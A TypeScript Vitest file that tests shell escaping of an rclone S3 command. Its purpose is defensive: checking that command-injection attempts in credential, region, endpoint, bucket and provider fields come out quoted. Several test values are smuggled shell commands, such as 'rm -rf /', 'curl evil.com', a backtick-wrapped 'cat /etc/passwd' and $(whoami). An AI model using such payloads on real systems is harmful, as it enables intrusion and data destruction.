import { describe, expect, test, vi } from "vitest";

// Import the shell escape function
function shellEscape(arg: string): string {
	return `'${arg.replace(/'/g, "'\\''")}'`;
}

// Mock the rclone command building process similar to what happens in destination.ts
function buildRcloneCommand(input: {
	accessKey: string;
	secretAccessKey: string;
	region: string;
	endpoint: string;
	bucket: string;
	provider?: string;
}): { command: string; args: string[] } {
	const { secretAccessKey, bucket, region, endpoint, accessKey, provider } =
		input;

	const rcloneArgs = [
		"ls",
		`--s3-access-key-id=${accessKey}`,
		`--s3-secret-access-key=${secretAccessKey}`,
		`--s3-region=${region}`,
		`--s3-endpoint=${endpoint}`,
		"--s3-no-check-bucket",
		"--s3-force-path-style",
	];

	if (provider) {
		rcloneArgs.splice(1, 0, `--s3-provider=${provider}`);
	}

	const rcloneDestination = `:s3:${bucket}`;
	rcloneArgs.push(rcloneDestination);

	// For remote execution, escape each argument
	const escapedArgs = rcloneArgs.map((arg) => shellEscape(arg));
	const rcloneCommand = `rclone ${escapedArgs.join(" ")}`;

	return { command: rcloneCommand, args: rcloneArgs };
}

describe("Destination Router Integration Tests - Command Injection Prevention", () => {
	describe("Rclone command building with safe parameters", () => {
		test("should build safe rclone command for AWS S3", () => {
			const input = {
				accessKey: "AKIAIOSFODNN7EXAMPLE",
				secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "my-bucket",
				provider: "AWS",
			};

			const { command, args } = buildRcloneCommand(input);

			// Verify args array is constructed correctly
			expect(args).toContain("ls");
			expect(args).toContain("--s3-provider=AWS");
			expect(args).toContain("--s3-access-key-id=AKIAIOSFODNN7EXAMPLE");
			expect(args).toContain(
				"--s3-secret-access-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			);
			expect(args).toContain("--s3-region=us-east-1");
			expect(args).toContain("--s3-endpoint=https://s3.amazonaws.com");
			expect(args).toContain(":s3:my-bucket");

			// Verify command is properly escaped
			expect(command).toContain("'ls'");
			expect(command).not.toContain("$(");
			expect(command).not.toContain("`");
		});

		test("should build safe rclone command for MinIO", () => {
			const input = {
				accessKey: "minioadmin",
				secretAccessKey: "minioadmin123",
				region: "us-east-1",
				endpoint: "http://localhost:9000",
				bucket: "backups",
				provider: "Minio",
			};

			const { command, args } = buildRcloneCommand(input);

			expect(args).toContain("--s3-provider=Minio");
			expect(args).toContain("--s3-access-key-id=minioadmin");
			expect(args).toContain("--s3-endpoint=http://localhost:9000");
			expect(args).toContain(":s3:backups");
		});

		test("should build safe rclone command without provider", () => {
			const input = {
				accessKey: "AKIAIOSFODNN7EXAMPLE",
				secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "my-bucket",
			};

			const { command, args } = buildRcloneCommand(input);

			// Provider should not be in args
			expect(args.some((arg) => arg.includes("--s3-provider"))).toBe(false);

			// But other args should be present
			expect(args).toContain("ls");
			expect(args).toContain("--s3-access-key-id=AKIAIOSFODNN7EXAMPLE");
		});
	});

	describe("Command injection prevention in rclone command building", () => {
		test("should safely escape command injection in accessKey", () => {
			const input = {
				accessKey: "KEY$(whoami)",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			// The command should have the injection attempt escaped
			expect(command).toContain("'--s3-access-key-id=KEY$(whoami)'");
			// The $(whoami) should be inside quotes, preventing execution
			expect(command).not.toMatch(/\$\(whoami\)(?!')/);
		});

		test("should safely escape command injection in secretAccessKey", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET; rm -rf /",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-secret-access-key=SECRET; rm -rf /'");
		});

		test("should safely escape command injection in bucket", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket`whoami`",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("':s3:bucket`whoami`'");
			// Backticks should be inside quotes
			expect(command).not.toMatch(/`whoami`(?!')/);
		});

		test("should safely escape command injection in region", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1|ls",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-region=us-east-1|ls'");
		});

		test("should safely escape command injection in endpoint", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com&&whoami",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-endpoint=https://s3.amazonaws.com&&whoami'");
		});

		test("should safely escape command injection in provider", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
				provider: "AWS;curl evil.com",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-provider=AWS;curl evil.com'");
		});

		test("should handle single quotes in parameters", () => {
			const input = {
				accessKey: "KEY'test",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			// Single quotes should be escaped properly
			expect(command).toContain("'\\''");
		});

		test("should prevent command chaining with semicolons", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket; echo PWNED",
			};

			const { command } = buildRcloneCommand(input);

			// The semicolon should be inside quotes
			expect(command).toContain("':s3:bucket; echo PWNED'");
		});

		test("should prevent command substitution with $(...)", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET$(curl evil.com)",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-secret-access-key=SECRET$(curl evil.com)'");
		});

		test("should prevent command substitution with backticks", () => {
			const input = {
				accessKey: "KEY`cat /etc/passwd`",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-access-key-id=KEY`cat /etc/passwd`'");
		});

		test("should prevent newline injection", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1\nwhoami",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { command } = buildRcloneCommand(input);

			expect(command).toContain("'--s3-region=us-east-1\nwhoami'");
		});
	});

	describe("Args array safety for execFileAsync", () => {
		test("args array should not contain unescaped shell metacharacters when passed to execFileAsync", () => {
			const input = {
				accessKey: "KEY",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { args } = buildRcloneCommand(input);

			// When passed to execFileAsync, these args are safe because
			// execFileAsync doesn't use a shell - it passes them directly
			// to the rclone process
			expect(Array.isArray(args)).toBe(true);
			expect(args[0]).toBe("ls");
			expect(args).toContain("--s3-access-key-id=KEY");
		});

		test("args array preserves shell metacharacters but they're safe with execFileAsync", () => {
			// This test demonstrates that even if the args contain
			// shell metacharacters, they're safe when passed to execFileAsync
			// because execFileAsync doesn't invoke a shell
			const input = {
				accessKey: "KEY$(whoami)",
				secretAccessKey: "SECRET",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "bucket",
			};

			const { args } = buildRcloneCommand(input);

			// The arg contains the shell metacharacters
			expect(args.some((arg) => arg.includes("$(whoami)"))).toBe(true);

			// But when passed to execFileAsync, these are treated as literal
			// strings, not as shell commands, so they're safe
			const keyArg = args.find((arg) => arg.includes("access-key-id"));
			expect(keyArg).toBe("--s3-access-key-id=KEY$(whoami)");
		});
	});

	describe("Complete command construction scenarios", () => {
		test("should handle all fields with potential injection attempts", () => {
			const input = {
				accessKey: "KEY;whoami",
				secretAccessKey: "SECRET|ls",
				region: "region&&cat",
				endpoint: "https://evil.com$(curl)",
				bucket: "bucket`id`",
				provider: "AWS\nmalicious",
			};

			const { command } = buildRcloneCommand(input);

			// All dangerous characters should be wrapped in single quotes
			expect(command).toContain("'ls'");
			expect(command).toContain("'--s3-provider=AWS\nmalicious'");
			expect(command).toContain("'--s3-access-key-id=KEY;whoami'");
			expect(command).toContain("'--s3-secret-access-key=SECRET|ls'");
			expect(command).toContain("'--s3-region=region&&cat'");
			expect(command).toContain("'--s3-endpoint=https://evil.com$(curl)'");
			expect(command).toContain("':s3:bucket`id`'");
		});

		test("should produce a command string safe for remote execution", () => {
			const input = {
				accessKey: "AKIAIOSFODNN7EXAMPLE",
				secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
				bucket: "my-bucket",
				provider: "AWS",
			};

			const { command } = buildRcloneCommand(input);

			// Should start with rclone
			expect(command).toMatch(/^rclone /);

			// Should have all args quoted
			const argCount = command.split("'").length - 1;
			// Should have an even number of quotes (each arg is wrapped)
			expect(argCount % 2).toBe(0);
		});
	});
});
